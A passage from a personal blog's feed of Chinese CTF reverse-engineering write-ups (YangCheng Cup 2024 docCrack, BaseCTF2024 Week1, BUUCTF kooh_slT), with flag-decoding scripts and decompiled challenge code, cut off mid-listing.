class="number">19</span>] = <span class="number">7488</span></span><br><span class="line">v7[<span class="number">20</span>] = <span class="number">6656</span></span><br><span class="line">v7[<span class="number">21</span>] = <span class="number">7296</span></span><br><span class="line">v7[<span class="number">22</span>] = <span class="number">7424</span></span><br><span class="line">v7[<span class="number">23</span>] = <span class="number">2432</span></span><br><span class="line">v7[<span class="number">24</span>] = <span class="number">2432</span></span><br><span class="line">v7[<span class="number">25</span>] = <span class="number">2432</span></span><br><span class="line">v7[<span class="number">26</span>] = <span class="number">5632</span></span><br><span class="line">v7[<span class="number">27</span>] = <span class="number">4416</span></span><br><span class="line">v7[<span class="number">28</span>] = <span class="number">3456</span></span><br><span class="line">v7[<span class="number">29</span>] = <span class="number">7168</span></span><br><span class="line">v7[<span class="number">30</span>] = <span class="number">6528</span></span><br><span class="line">v7[<span class="number">31</span>] = <span class="number">7488</span></span><br><span class="line">v7[<span class="number">32</span>] = <span class="number">6272</span></span><br><span class="line">v7[<span class="number">33</span>] = <span class="number">5632</span></span><br><span class="line">v7[<span class="number">34</span>] = <span class="number">3520</span></span><br><span class="line">v7[<span class="number">35</span>] = <span class="number">6208</span></span><br><span class="line">v7[<span class="number">36</span>] = <span class="number">5632</span></span><br><span class="line">v7[<span class="number">37</span>] = <span class="number">4736</span></span><br><span class="line">v7[<span class="number">38</span>] = <span class="number">6528</span></span><br><span class="line">v7[<span class="number">39</span>] = <span class="number">6400</span></span><br><span class="line">v7[<span class="number">40</span>] = <span class="number">7488</span></span><br><span class="line">v7[<span class="number">41</span>] = <span class="number">3520</span></span><br><span class="line">v7[<span class="number">42</span>] = <span class="number">5632</span></span><br><span class="line">v7[<span class="number">43</span>] = <span class="number">5184</span></span><br><span class="line">v7[<span class="number">44</span>] = <span class="number">3456</span></span><br><span class="line">v7[<span class="number">45</span>] = <span class="number">7488</span></span><br><span class="line">v7[<span class="number">46</span>] = <span class="number">7296</span></span><br><span class="line">v7[<span class="number">47</span>] = <span class="number">3200</span></span><br><span class="line">v7[<span class="number">48</span>] = <span class="number">6272</span></span><br><span class="line">v7[<span class="number">49</span>] = <span class="number">7424</span></span><br><span class="line">v7[<span class="number">50</span>] = <span class="number">2432</span></span><br><span class="line">v7[<span class="number">51</span>] = <span class="number">2432</span></span><br><span class="line">v7[<span class="number">52</span>] = <span class="number">2432</span></span><br><span class="line">v7[<span class="number">53</span>] = <span class="number">7808</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">54</span>):</span><br><span class="line">    flag += <span class="built_in">chr</span>(v7[i] &gt;&gt; <span class="number">6</span> ^ <span class="number">7</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># DASCTF&#123;Vba_1s_dangerous!!!_B1ware_0f_Macr0_V1ru5es!!!&#125;</span></span><br><span class="line"><span class="comment">#乐，如果不异或7，头六个是CFTDSA，妙喵</span></span><br></pre></td></tr></table></figure><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>一瞬觉得做的题太少了，怎么这个时候才发现这么好玩的题目</p><p>另一瞬觉得，现在了解到知道学到了，也是一件很幸福的事情——</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;🐏羊城杯2024-Reverse-docCrack&quot;&gt;&lt;a href=&quot;#🐏羊城杯2024-Reverse-docCrack&quot; class=&quot;headerlink&quot; title=&quot;🐏羊城杯2024 | Reverse_docCrack&quot;&gt;&lt;/a&gt;🐏羊城杯2</summary>
      
    
    
    
    
    <category term="OJ" scheme="https://github.com/xyy9233/xyy9233.github.io.git/tags/OJ/"/>
    
  </entry>
  
  <entry>
    <title>BaseCTF2024</title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/08/24/BaseCTF2024_Reverse/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/08/24/BaseCTF2024_Reverse/</id>
    <published>2024-08-23T16:00:00.000Z</published>
    <updated>2024-09-16T07:56:07.701Z</updated>
    
    <content type="html"><![CDATA[<h1 id="BaseCTF2024-Week1"><a href="#BaseCTF2024-Week1" class="headerlink" title="BaseCTF2024[Week1]"></a>BaseCTF2024[Week1]</h1><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="You-are-good-at-IDA"><a href="#You-are-good-at-IDA" class="headerlink" title="You are good at IDA"></a>You are good at IDA</h3><h4 id="Part1"><a href="#Part1" class="headerlink" title="Part1"></a>Part1</h4><p>打开IDA按F5，得到第一部分</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240824135041482.png" alt="image-20240824135041482"></p><h4 id="Part2"><a href="#Part2" class="headerlink" title="Part2"></a>Part2</h4><p>根据以上提示，shift+F2:</p><p>Second字符点击进入，按“X”交叉引入找到对应函数，</p><p>得到第二部分flag，按“R”转换为字符：</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240824135517153.png" alt="image-20240824135517153"></p><h4 id="Part3"><a href="#Part3" class="headerlink" title="Part3"></a>Part3</h4><p>第三部分flag在一个Interesting的函数中：</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240824135453999.png" alt="image-20240824135453999"></p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240824135535863.png" alt="image-20240824135535863"></p><h4 id="flag"><a href="#flag" class="headerlink" title="flag:"></a>flag:</h4><p>BaseCTF{Y0u_4Re_900d_47_id4}</p><h3 id="UPX-mini"><a href="#UPX-mini" class="headerlink" title="UPX mini"></a>UPX mini</h3><p>拖DIE中查壳儿，4.01版本</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240824140522684.png" alt="image-20240824140522684"></p><p><code>upx -d  UPXmini.exe</code></p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240824143602786.png" alt="image-20240824143602786"></p><p>点击base64函数，发现没换表，有密文，直接出flag</p><p>附一个标准base64：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">_BYTE *__fastcall <span class="title function_">base64_encode</span><span class="params">(<span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  _BYTE *v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v4[<span class="number">72</span>]; <span class="comment">// [rsp+20h] [rbp-70h] BYREF</span></span><br><span class="line">  _BYTE *v5; <span class="comment">// [rsp+68h] [rbp-28h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+74h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">char</span> *Str; <span class="comment">// [rsp+78h] [rbp-18h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [rsp+80h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [rsp+84h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [rsp+88h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [rsp+8Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  Str = a1;</span><br><span class="line">  <span class="built_in">strcpy</span>(v4, <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>);</span><br><span class="line">  v6 = <span class="built_in">strlen</span>(a1);</span><br><span class="line">  v1 = v6 % <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v6 % <span class="number">3</span> == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = <span class="number">1</span>;</span><br><span class="line">    v11 = <span class="number">4</span> * (v6 / <span class="number">3</span> + <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( v1 == <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = <span class="number">2</span>;</span><br><span class="line">    v11 = <span class="number">4</span> * (v6 / <span class="number">3</span> + <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( !v1 )</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = <span class="number">0</span>;</span><br><span class="line">    v11 = <span class="number">4</span> * (v6 / <span class="number">3</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v5 = <span class="built_in">malloc</span>(v11 + <span class="number">1</span>);</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( v8 &lt; v6 - v10 )</span><br><span class="line">  &#123;</span><br><span class="line">    v5[v9] = v4[(<span class="type">int</span>)(<span class="type">unsigned</span> __int8)Str[v8] &gt;&gt; <span class="number">2</span>];</span><br><span class="line">    v5[v9 + <span class="number">1</span>] = v4[((<span class="type">int</span>)(<span class="type">unsigned</span> __int8)Str[v8 + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>) | (<span class="number">16</span> * Str[v8]) &amp; <span class="number">0x30</span>];</span><br><span class="line">    v5[v9 + <span class="number">2</span>] = v4[((<span class="type">int</span>)(<span class="type">unsigned</span> __int8)Str[v8 + <span class="number">2</span>] &gt;&gt; <span class="number">6</span>) | (<span class="number">4</span> * Str[v8 + <span class="number">1</span>]) &amp; <span class="number">0x3C</span>];</span><br><span class="line">    v5[v9 + <span class="number">3</span>] = v4[Str[v8 + <span class="number">2</span>] &amp; <span class="number">0x3F</span>];</span><br><span class="line">    v8 += <span class="number">3</span>;</span><br><span class="line">    v9 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v10 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v5[v11 - <span class="number">4</span>] = v4[(<span class="type">int</span>)(<span class="type">unsigned</span> __int8)Str[v6 - <span class="number">1</span>] &gt;&gt; <span class="number">2</span>];</span><br><span class="line">    v5[v11 - <span class="number">3</span>] = v4[(<span class="number">16</span> * Str[v6 - <span class="number">1</span>]) &amp; <span class="number">0x30</span>];</span><br><span class="line">    v2 = &amp;v5[v11 - <span class="number">1</span>];</span><br><span class="line">    *v2 = <span class="number">61</span>;</span><br><span class="line">    v5[v11 - <span class="number">2</span>] = *v2;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( v10 == <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v5[v11 - <span class="number">4</span>] = v4[(<span class="type">int</span>)(<span class="type">unsigned</span> __int8)Str[v6 - <span class="number">2</span>] &gt;&gt; <span class="number">2</span>];</span><br><span class="line">    v5[v11 - <span class="number">3</span>] = v4[((<span class="type">int</span>)(<span class="type">unsigned</span> __int8)Str[v6 - <span class="number">1</span>] &gt;&gt; <span class="number">4</span>) | (<span class="number">16</span> * Str[v6 - <span class="number">2</span>]) &amp; <span class="number">0x30</span>];</span><br><span class="line">    v5[v11 - <span class="number">2</span>] = v4[(<span class="number">4</span> * Str[v6 - <span class="number">1</span>]) &amp; <span class="number">0x3C</span>];</span><br><span class="line">    v5[v11 - <span class="number">1</span>] = <span class="number">61</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v5[v11] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Ez-Xor"><a href="#Ez-Xor" class="headerlink" title="Ez Xor"></a>Ez Xor</h3><p>无壳</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240824144240382.png" alt="image-20240824144240382"></p><p>看逻辑，判断输入字符为28位，处理v4(假设为密钥”Xor”)，加密输入字符，与密文比较——</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240824144219198.png" alt="image-20240824144219198"></p><p>Set item type 改数据类型</p><p>异或串1由i异或key循环产生28位</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240824154936713.png" alt="image-20240824154936713"></p><p>flag与 逆转的异或串1 异或产生字符串Str</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240824193746260.png" alt="image-20240824193746260"></p><p>最后Str与给的密文比较</p><p>逻辑也简单，写脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">key = [<span class="number">0x58</span>,<span class="number">0x6F</span>,<span class="number">0x72</span>] <span class="comment">#Xor转16进制</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">box = []</span><br><span class="line">b = <span class="string">&quot;&quot;</span></span><br><span class="line">Str = [</span><br><span class="line">    <span class="number">0x01</span>, <span class="number">0x09</span>, <span class="number">0x05</span>, <span class="number">0x25</span>, <span class="number">0x26</span>, <span class="number">0x2D</span>, <span class="number">0x0B</span>, <span class="number">0x1D</span>, </span><br><span class="line">    <span class="number">0x24</span>, <span class="number">0x7A</span>, <span class="number">0x31</span>, <span class="number">0x20</span>, <span class="number">0x1E</span>, <span class="number">0x49</span>, <span class="number">0x3D</span>, <span class="number">0x67</span>, </span><br><span class="line">    <span class="number">0x4D</span>, <span class="number">0x50</span>, <span class="number">0x08</span>, <span class="number">0x25</span>, <span class="number">0x2E</span>, <span class="number">0x6E</span>, <span class="number">0x05</span>, <span class="number">0x34</span>, </span><br><span class="line">    <span class="number">0x22</span>, <span class="number">0x40</span>, <span class="number">0x3b</span>, <span class="number">0x25</span>, ]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">28</span>):</span><br><span class="line">   flag +=<span class="built_in">chr</span>(i ^ enflag[<span class="number">27</span>-i] ^ key[i%<span class="number">3</span>] )</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag[::-<span class="number">1</span>])</span><br><span class="line"><span class="comment"># BaseCTF&#123;X0R_I5_345Y_F0r_y0U&#125; </span></span><br></pre></td></tr></table></figure><h3 id="ez-maze"><a href="#ez-maze" class="headerlink" title="ez_maze"></a>ez_maze</h3><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240824200108696.png" alt="image-20240824200108696"></p><p>wa！迷宫！</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240824200625193.png" alt="image-20240824200625193"></p><p>出来啦！<code>sssssssddddwwwddsssssssdddsssddddd</code></p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240824200720082.png" alt="image-20240824200720082"></p><h3 id="BasePlus"><a href="#BasePlus" class="headerlink" title="BasePlus"></a>BasePlus</h3><p>看题目，看main函数：</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240824200822549.png" alt="image-20240824200822549"></p><p>encode：看着像base64，但是Plus！细细看，不只是换了表</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">Encode</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// r10d</span></span><br><span class="line">  <span class="type">char</span> *v4; <span class="comment">// r9</span></span><br><span class="line">  __int64 v5; <span class="comment">// r8</span></span><br><span class="line">  __int64 v6; <span class="comment">// rdi</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// ebp</span></span><br><span class="line">  __int64 v8; <span class="comment">// rax</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  __int64 v10; <span class="comment">// rax</span></span><br><span class="line">  __int64 v11; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">bool</span> v12; <span class="comment">// r13</span></span><br><span class="line">  <span class="type">bool</span> v13; <span class="comment">// r12</span></span><br><span class="line">  <span class="type">char</span> v14; <span class="comment">// [rsp+8h] [rbp-40h]</span></span><br><span class="line">  __int16 v15; <span class="comment">// [rsp+9h] [rbp-3Fh]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v16; <span class="comment">// [rsp+Bh] [rbp-3Dh]</span></span><br><span class="line">  <span class="type">char</span> v17[<span class="number">60</span>]; <span class="comment">// [rsp+Ch] [rbp-3Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="built_in">strlen</span>(a1);</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(result) = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v4 = v17;</span><br><span class="line">    v5 = <span class="number">4</span>i64;</span><br><span class="line">    v6 = <span class="number">0</span>i64;</span><br><span class="line">    v7 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v15 = <span class="number">0</span>;</span><br><span class="line">      v16 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v3 &gt; v7 )</span><br><span class="line">      &#123;</span><br><span class="line">        v10 = v7 + <span class="number">1</span>;</span><br><span class="line">        v11 = <span class="number">1</span>i64;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          v7 = v10;</span><br><span class="line">          *(&amp;v14 + v11) = a1[v10 - <span class="number">1</span>];</span><br><span class="line">          v12 = (<span class="type">int</span>)v11 &lt;= <span class="number">2</span>;</span><br><span class="line">          v13 = v3 &gt; (<span class="type">int</span>)v10++;</span><br><span class="line">          ++v11;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ( v13 &amp;&amp; v12 );</span><br><span class="line">      &#125;</span><br><span class="line">      v17[<span class="number">0</span>] = Secret[(<span class="type">unsigned</span> __int8)v15 &gt;&gt; <span class="number">2</span>];</span><br><span class="line">      v17[<span class="number">1</span>] = Secret[(HIBYTE(v15) &gt;&gt; <span class="number">4</span>) | (<span class="number">16</span> * (_BYTE)v15) &amp; <span class="number">0x30</span>];</span><br><span class="line">      v17[<span class="number">2</span>] = Secret[(v16 &gt;&gt; <span class="number">6</span>) | (<span class="number">4</span> * HIBYTE(v15)) &amp; <span class="number">0x3C</span>];</span><br><span class="line">      v17[<span class="number">3</span>] = Secret[v16 &amp; <span class="number">0x3F</span>];</span><br><span class="line">      v8 = v6;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        *(_BYTE *)(a2 + v8) = v4[v8] ^ <span class="number">0xE</span>;</span><br><span class="line">        ++v8;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v8 != v5 );</span><br><span class="line">      LODWORD(result) = v5;</span><br><span class="line">      v6 += <span class="number">4</span>i64;</span><br><span class="line">      v4 -= <span class="number">4</span>;</span><br><span class="line">      v5 += <span class="number">4</span>i64;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v3 &gt; v7 );</span><br><span class="line">  &#125;</span><br><span class="line">  result = (<span class="type">int</span>)result;</span><br><span class="line">  *(_BYTE *)(a2 + (<span class="type">int</span>)result) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240824201050815.png" alt="image-20240824201050815"></p><p>果然结果异或0xE</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240824201316243.png" alt="image-20240824201316243"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;BaseCTF2024-Week1&quot;&gt;&lt;a href=&quot;#BaseCTF2024-Week1&quot; class=&quot;headerlink&quot; title=&quot;BaseCTF2024[Week1]&quot;&gt;&lt;/a&gt;BaseCTF2024[Week1]&lt;/h1&gt;&lt;h2 id=&quot;Rev</summary>
      
    
    
    
    
    <category term="CTF RE" scheme="https://github.com/xyy9233/xyy9233.github.io.git/tags/CTF-RE/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTF 2023 WEEK4|REVERSE kooh_slT</title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/08/12/BUUCTF%202023%20WEEK4REVERSE%20kooh_slT/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/08/12/BUUCTF%202023%20WEEK4REVERSE%20kooh_slT/</id>
    <published>2024-08-11T16:00:00.000Z</published>
    <updated>2024-09-16T07:18:21.909Z</updated>
    
    <content type="html"><![CDATA[<h1 id="BUUCTF-2023-WEEK4-REVERSE-kooh-slT"><a href="#BUUCTF-2023-WEEK4-REVERSE-kooh-slT" class="headerlink" title="BUUCTF 2023 WEEK4|REVERSE kooh_slT"></a>BUUCTF 2023 WEEK4|REVERSE kooh_slT</h1><p>参考博客：<br><a href="http://www.chillysome.top/index.php/2024/03/15/tls%e5%9b%9e%e8%b0%83%e5%87%bd%e6%95%b0-%e4%b8%80%e6%96%87%e7%9c%8b%e6%87%82%ef%bc%88%e8%af%a6%ef%bc%89/">TLS回调函数–一文看懂（详）</a></p><p><a href="https://www.cnblogs.com/NozoMizo/articles/17788108.html">NewstarCTF2023 week4 re </a></p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><h4 id="main函数："><a href="#main函数：" class="headerlink" title="main函数："></a>main函数：</h4><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240811165013781.png" alt="image-20240811165013781"></p><blockquote><p> <code>calloc</code>不仅分配内存，还会将分配的内存初始化为0。</p></blockquote><p>创建了一个新的线程，线程的起始地址是<code>StartAddress</code>函数。<code>CreateThread</code>函数返回的线程句柄存储在<code>hHandle</code>中</p><p>WaitForSingleObject(hHandle, 0xFFFFFFFF);</p><p>这里的<code>WaitForSingleObject</code>函数用于等待线程<code>hHandle</code>执行完毕。<code>0xFFFFFFFF</code>（即<code>INFINITE</code>）表示无限等待，直到线程执行完成。</p><p>sub401500明显是base64</p><h4 id="进入StartAddress："><a href="#进入StartAddress：" class="headerlink" title="进入StartAddress："></a>进入StartAddress：</h4><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240811171621563.png" alt="image-20240811171621563"></p><p>在声明变量、创建快照、初始化之后</p><blockquote><p><code>CreateToolhelp32Snapshot</code> 创建一个进程快照，参数 <code>2u</code> 表示快照类型为所有进程。如果创建失败（即返回 <code>INVALID_HANDLE_VALUE</code> 或 <code>(HANDLE)-1</code>），函数直接返回 <code>0</code>，表示失败。</p><p><code>pe.dwSize</code> 必须设置为 <code>PROCESSENTRY32W</code> 结构体的大小，以便调用 <code>Process32FirstW</code> 函数时正确使用</p></blockquote><p>似乎什么都没有做，看汇编，有一部分是灰色的，花指令：</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240811172330917.png" alt="image-20240811172330917"></p><p>先把跳转函数nop</p><p>直接Crtl+N容易把后面信息也nop了，这里shift+F2</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240811185021197.png" alt="image-20240811185021197"></p><p>剩了点，一会重新分析就好，按C分析，下面还有一部分</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240811185127542.png" alt="image-20240811185127542"></p><p>全部重新分析后可以看到完整的函数：</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240811234931637.png" alt="image-20240811234931637"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hSnapshot = CreateToolhelp32Snapshot(<span class="number">2u</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> ( hSnapshot == (HANDLE)<span class="number">-1</span> )</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure><blockquote><ul><li><code>CreateToolhelp32Snapshot</code> 传入的参数 <code>2u</code> 表示获取系统中所有的进程快照。成功时返回一个快照句柄，失败时返回 <code>INVALID_HANDLE_VALUE</code> (通常为 <code>(HANDLE)-1</code>)。</li><li>如果 <code>CreateToolhelp32Snapshot</code> 返回 <code>-1</code>，函数立即返回 <code>0</code>，表示失败。</li></ul></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( Process32FirstW(hSnapshot, &amp;pe) )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">      <span class="comment">//在每次循环中，代码通过 `wcscmp` 比较当前进程名称 `pe.szExeFile` 与存储在 `word_4A7010` 的9个进程名称（每个名称长度为50个字节）进行比较</span></span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">9</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">     wcscmp(pe.szExeFile, (<span class="type">const</span> <span class="type">wchar_t</span> *)&amp;word_4A7010[<span class="number">50</span> * i]);</span><br><span class="line">    OpenProcess(<span class="number">0x1FFFFF</span>u, <span class="number">0</span>, pe.th32ProcessID);<span class="comment">//调用 `OpenProcess` 尝试打开进程，标志值 `0x1FFFFFu` 代表所需的所有访问权限。</span></span><br><span class="line">  &#125;</span><br><span class="line">    <span class="comment">//在循环结束后（即没有匹配的进程名），关闭快照句柄，并调用 `sub_401500` 进行进一步的处理，然后返回 `1`，表示成功。</span></span><br><span class="line">  <span class="keyword">while</span> ( Process32NextW(hSnapshot, &amp;pe) );</span><br><span class="line">  CloseHandle(hSnapshot);</span><br><span class="line">  sub_401500(byte_4A7E74, dword_4A7E70, Str1);</span><br><span class="line">  